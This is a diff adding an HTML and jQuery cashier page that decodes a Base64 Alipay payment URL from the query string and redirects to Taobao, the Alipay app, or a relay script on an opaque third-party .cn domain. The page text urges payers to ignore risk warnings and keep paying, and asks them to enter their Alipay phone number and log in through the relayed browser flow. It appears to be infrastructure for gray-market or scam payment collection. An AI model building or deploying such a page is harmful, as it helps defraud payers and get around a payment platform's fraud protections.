@@ -1,0 +1,616 @@
+<!DOCTYPE html>
+
+<!-- saved from url=(0060)http://syt2.goalmsi.com/cashier/pay.php?token=C_164056439707 -->
+
+<html><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+
+
+
+	<meta http-equiv="X-UA-Compatible" content="IE=edge">
+
+	<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, minimum-scale=1, user-scalable=no">
+
+	<meta name="renderer" content="webkit">
+
+	<meta name="HandheldFriendly" content="True">
+
+	<meta name="MobileOptimized" content="320">
+
+	<meta name="format-detection" content="telephone=no">
+
+	<meta name="apple-mobile-web-app-capable" content="yes">
+
+	<meta name="referrer" content="no-referrer">
+
+	<meta name="apple-mobile-web-app-status-bar-style" content="black">
+
+	<title>收银台</title>
+
+	<link href="./pc.css" rel="stylesheet">
+
+	<style>
+
+		.pay-success, .pay-fail {
+
+			position: absolute;
+
+			top: 0;
+
+			right: 0;
+
+			left: 0;
+
+			bottom: 0;
+
+			z-index: 99999999999999;
+
+			background: rgba(0, 0, 0, .50);
+
+			text-align: center;
+
+			height: 100%;
+
+		}
+
+
+
+		.pay-success img, .pay-fail img {
+
+			width: 42px;
+
+			height: 42px;
+
+			margin-top: 20px
+
+		}
+
+
+
+		.pay-success p, .pay-fail p {
+
+			font-size: 14px;
+
+			color: #222;
+
+			margin-top: 10px
+
+		}
+
+		@keyframes blink{
+
+
+
+			0%{opacity: 1;}
+
+
+
+			100%{opacity: 0;}
+
+
+
+		}
+
+
+
+		@-webkit-keyframes blink {
+
+
+
+			0% { opacity: 1; }
+
+
+
+			100% { opacity: 0; }
+
+
+
+		}
+
+
+
+		@-moz-keyframes blink {
+
+
+
+			0% { opacity: 1; }
+
+
+
+			100% { opacity: 0; }
+
+
+
+		}
+
+
+
+		@-ms-keyframes blink {
+
+
+
+			0% {opacity: 1; }
+
+
+
+			100% { opacity: 0;}
+
+
+
+		}
+
+
+
+		@-o-keyframes blink {
+
+
+
+			0% { opacity: 1; }
+
+
+
+			100% { opacity: 0; }
+
+
+
+		}
+
+
+
+
+
+
+
+		.blink{
+
+
+
+			color: #dd4814;
+
+
+
+			animation: blink 1s linear infinite;
+
+
+
+			-webkit-animation: blink 1s linear infinite;
+
+
+
+			-moz-animation: blink 1s linear infinite;
+
+
+
+			-ms-animation: blink 1s linear infinite;
+
+
+
+			-o-animation: blink 1s linear infinite;
+
+
+
+		}
+
+	</style>
+
+	<script src="https://cdn.bootcss.com/jquery/3.4.1/jquery.slim.js"></script>
+
+</head>
+
+<body style="" sip-shortcut-listen="true">
+
+<div class="container" style="position: relative;">
+
+	<div class="pay-success" style="display: none; height: 812px;">
+
+		<div style="margin-top: 50%"></div>
+
+		<div style="width: 80%; padding-top: 30px; margin: 0 auto; background: #ffffff; border-radius: 10px; border: solid #ccc 1px; padding-bottom: 20px;">
+
+			<div style="font-size: 20px;">温馨提示</div>
+
+			<img src="./ic_checked.svg" alt="">
+
+			<p style="font-size: 18px; line-height: 180%; color: red; font-weight: bold;">支付成功</p>
+
+		</div>
+
+	</div>
+
+	<h1 class="title" style="margin-bottom: 15px;">
+
+		<span class="title-logo logo-ali"></span>
+
+	</h1>
+
+	<div class="content">
+
+		<div class="pay-wave"></div>
+
+		<div class="pay-amount" style="color: red; font-size: 28px; font-weight: bold; margin-bottom: 10px;"></div>
+
+		<div style="margin: 0 auto; font-size: 20px; color: red; font-weight: bold;">如果遇到风险提示,请点击继续付款</div>
+
+		<div class="pay-hint" style="line-height: 20px; color:#333;  text-align:left; font-size:14px; display:none">温馨提示:请按照提示,点击立即支付.</div>
+
+		<div class="taobao">
+			<a href="javascript:void(0);" onclick="redirectToTaobao()" style="text-decoration:none">
+
+				<div style="margin: 10px 0 10px 0; font-size: 18px; background: #FF0000; color: #fff; line-height: 45px; font-weight: bold;">淘宝支付(强烈推荐,支付率极高)</div>
+
+			</a>
+			<div class="pay-hint" style="line-height: 20px;text-align:left; font-size:14px;font-weight: bold;">温馨提示:如果您安装了淘宝请点击,如果没有请选择浏览器支付</div>
+		</div>
+
+		<a href="javascript:void(0);" onclick="redirectToMapi()" style="text-decoration:none"><br>
+
+			<div style="margin: 10px 0 10px 0; font-size: 18px; background: #f1c211; color: #fff; line-height: 45px; font-weight: bold;">浏览器支付(第一次需登录成功率高)</div>
+
+		</a>
+
+		<div class="pay-hint" style="line-height: 20px;text-align:left; font-size:14px;font-weight: bold;">温馨提示:浏览器支付,请按照提示输入支付宝手机号,登录支付宝官网网页版第一次登录,完成交易后,下次交易不需要输入手机号码,请放心支付</div>
+
+		<a href="javascript:void(0);" onclick="redirectToH5()" rel="noreferrer" style="text-decoration:none">
+
+			<div style="margin: 10px 0 10px 0; font-size: 18px; background: #00A0E9; color: #fff; line-height: 45px; font-weight: bold;">支付宝APP支付(看人品)</div>
+
+		</a>
+
+
+
+	</div>
+
+</div>
+<script>
+
+	$(".pay-success").css("height",$(document).height());
+
+</script>
+
+<!-- 使用alipayWeb -->
+
+<script src="https://cdn.bootcss.com/jquery/3.4.1/jquery.min.js"></script>
+
+<script type="text/javascript">
+	$(function () {
+		var u = navigator.userAgent;
+		var isiOS = !!u.match(/\(i[^;]+;( U;)? CPU.+Mac OS X/); //ios终端
+		if(isiOS){
+			$(".taobao").attr("style","display:none;");
+		}
+	})
+
+	$.getUrlParam = function (name) {
+
+		var reg = new RegExp("(^|&)" + name + "=([^&]*)(&|$)");
+
+		var r = window.location.search.substr(1).match(reg);
+
+		if (r != null) return unescape(r[2]); return null;
+
+	}
+
+	var desUrl	= 'http://asdgahdj6yu.dhsfvsdtgrevszdf4.cn:9001/pay.php';
+
+	// 获取金额
+
+	var total	= $.getUrlParam('total');
+
+	console.log(total);
+
+	// 赋值总金额
+
+	var	totalStr = total == null ? "￥0.00" : ("￥"+total);
+
+	console.log(totalStr);
+
+
+
+	$(".pay-amount").text(totalStr);
+
+
+
+	function Base64() {
+
+
+
+		// private property
+
+		_keyStr = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=";
+
+
+
+		// public method for encoding
+
+		this.encode = function (input) {
+
+			var output = "";
+
+			var chr1, chr2, chr3, enc1, enc2, enc3, enc4;
+
+			var i = 0;
+
+			input = _utf8_encode(input);
+
+			while (i < input.length) {
+
+				chr1 = input.charCodeAt(i++);
+
+				chr2 = input.charCodeAt(i++);
+
+				chr3 = input.charCodeAt(i++);
+
+				enc1 = chr1 >> 2;
+
+				enc2 = ((chr1 & 3) << 4) | (chr2 >> 4);
+
+				enc3 = ((chr2 & 15) << 2) | (chr3 >> 6);
+
+				enc4 = chr3 & 63;
+
+				if (isNaN(chr2)) {
+
+					enc3 = enc4 = 64;
+
+				} else if (isNaN(chr3)) {
+
+					enc4 = 64;
+
+				}
+
+				output = output +
+
+						_keyStr.charAt(enc1) + _keyStr.charAt(enc2) +
+
+						_keyStr.charAt(enc3) + _keyStr.charAt(enc4);
+
+			}
+
+			return output;
+
+		}
+
+
+
+		// public method for decoding
+
+		this.decode = function (input) {
+
+			var output = "";
+
+			var chr1, chr2, chr3;
+
+			var enc1, enc2, enc3, enc4;
+
+			var i = 0;
+
+			input = input.replace(/[^A-Za-z0-9\+\/\=]/g, "");
+
+			while (i < input.length) {
+
+				enc1 = _keyStr.indexOf(input.charAt(i++));
+
+				enc2 = _keyStr.indexOf(input.charAt(i++));
+
+				enc3 = _keyStr.indexOf(input.charAt(i++));
+
+				enc4 = _keyStr.indexOf(input.charAt(i++));
+
+				chr1 = (enc1 << 2) | (enc2 >> 4);
+
+				chr2 = ((enc2 & 15) << 4) | (enc3 >> 2);
+
+				chr3 = ((enc3 & 3) << 6) | enc4;
+
+				output = output + String.fromCharCode(chr1);
+
+				if (enc3 != 64) {
+
+					output = output + String.fromCharCode(chr2);
+
+				}
+
+				if (enc4 != 64) {
+
+					output = output + String.fromCharCode(chr3);
+
+				}
+
+			}
+
+			output = _utf8_decode(output);
+
+			return output;
+
+		}
+
+
+
+		// private method for UTF-8 encoding
+
+		_utf8_encode = function (string) {
+
+			string = string.replace(/\r\n/g,"\n");
+
+			var utftext = "";
+
+			for (var n = 0; n < string.length; n++) {
+
+				var c = string.charCodeAt(n);
+
+				if (c < 128) {
+
+					utftext += String.fromCharCode(c);
+
+				} else if((c > 127) && (c < 2048)) {
+
+					utftext += String.fromCharCode((c >> 6) | 192);
+
+					utftext += String.fromCharCode((c & 63) | 128);
+
+				} else {
+
+					utftext += String.fromCharCode((c >> 12) | 224);
+
+					utftext += String.fromCharCode(((c >> 6) & 63) | 128);
+
+					utftext += String.fromCharCode((c & 63) | 128);
+
+				}
+
+
+
+			}
+
+			return utftext;
+
+		}
+
+
+
+		// private method for UTF-8 decoding
+
+		_utf8_decode = function (utftext) {
+
+			var string = "";
+
+			var i = 0;
+
+			var c = c1 = c2 = 0;
+
+			while ( i < utftext.length ) {
+
+				c = utftext.charCodeAt(i);
+
+				if (c < 128) {
+
+					string += String.fromCharCode(c);
+
+					i++;
+
+				} else if((c > 191) && (c < 224)) {
+
+					c2 = utftext.charCodeAt(i+1);
+
+					string += String.fromCharCode(((c & 31) << 6) | (c2 & 63));
+
+					i += 2;
+
+				} else {
+
+					c2 = utftext.charCodeAt(i+1);
+
+					c3 = utftext.charCodeAt(i+2);
+
+					string += String.fromCharCode(((c & 15) << 12) | ((c2 & 63) << 6) | (c3 & 63));
+
+					i += 3;
+
+				}
+
+			}
+
+			return string;
+
+		}
+
+	}
+
+
+
+	function redirectToH5()
+
+	{
+
+		var mclient	=	'https://mclient.alipay.com/h5Continue.htm?';
+
+		var base 	= 	new Base64();
+
+		var url 	= 	$.getUrlParam('url');
+
+
+
+		if (url == null) {
+
+			alert('Url Must Not Empty!!!!');
+
+		}else{
+
+			var result = base.decode(url);
+
+			console.log(result);
+
+			//直接拉起
+
+			window.location.href =  mclient+result;
+
+		}
+
+	}
+
+	//成功率贼高(抓取mapi的页面)
+
+	function redirectToMapi()
+
+	{
+
+		var mclient	=	'https://mapi.alipay.com/gateway.do?';
+
+		var base = new Base64();
+
+		var url 	= $.getUrlParam('url');
+
+
+
+		if (url == null) {
+
+			alert('Url Must Not Empty!!!!');
+
+		}else{
+
+			var result = base.decode(url);
+
+			console.log(result);
+
+			//拼上完整的url，跳转至pay.php
+
+			var finalUrl = desUrl + "?url=" + base.encode(mclient + result);
+
+			console.log(finalUrl);
+
+			window.location.href =  finalUrl;
+
+		}
+
+	}
+	function redirectToTaobao()
+
+	{
+
+		var mclient	=	'taobao://mapi.alipay.com/gateway.do?';
+
+		var base = new Base64();
+
+		var url 	= $.getUrlParam('url');
+
+
+
+		if (url == null) {
+
+			alert('Url Must Not Empty!!!!');
+
+		}else{
+
+			var result = base.decode(url);
+
+			console.log(mclient+result);
+
+			//拼上完整的url，跳转至pay.php
+			window.location.href =  mclient+result;
+
+		}
+
+	}
+
+</script>
+
+</body></html>
